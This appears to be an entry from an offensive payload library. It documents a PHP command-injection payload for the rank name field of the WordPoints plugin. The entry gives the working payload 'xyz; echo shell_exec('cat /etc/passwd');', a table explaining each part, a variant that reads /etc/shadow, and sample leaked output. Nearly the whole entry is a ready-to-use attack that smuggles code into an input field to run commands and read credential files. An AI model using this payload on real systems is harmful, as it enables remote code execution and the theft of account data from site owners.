---
data: xyz; echo shell_exec('cat /etc/passwd');
tags:
  - rce
  - command-injection
  - php
type: command
executor: php
platforms:
  - Web
  - Linux
id: 1ebcbf6b-5bf2-4eae-96e9-431f6a49b508
created_at: '2025-12-14T17:28:20.229Z'
updated_at: '2025-12-14T17:28:20.229Z'
verified: false
validated: true
submitted: true
---
# php-injection-shell-exec-cat-passwd

## Command

```php
xyz; echo shell_exec('cat /etc/passwd');
```

## Description

This PHP injection payload is used in the rank name field during WordPoints rank creation to attempt command injection and remote code execution, executing the inner cat command to disclose the /etc/passwd file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `xyz;` | Prefix to disguise the payload | Yes |
| `echo shell_exec(...)` | PHP function to execute system command | Yes |
| `cat /etc/passwd` | Inner command to read password file | Yes |

## Examples

### Basic Usage

In rank name input:

```php
xyz; echo shell_exec('cat /etc/passwd');
```

### Advanced Usage

Extend for other files:

```php
xyz; echo shell_exec('cat /etc/shadow');
```

## Expected Output

Content of /etc/passwd added to the web page output, e.g., root:x:0:0:root:/root:/bin/bash
user1:x:1000:1000:user1:/home/user1:/bin/sh

## Related

- [[commands/cat-etc-passwd]]
- [[procedures/Crafting-Injection-Payloads-for-Rank-Creation-Exploitation]]
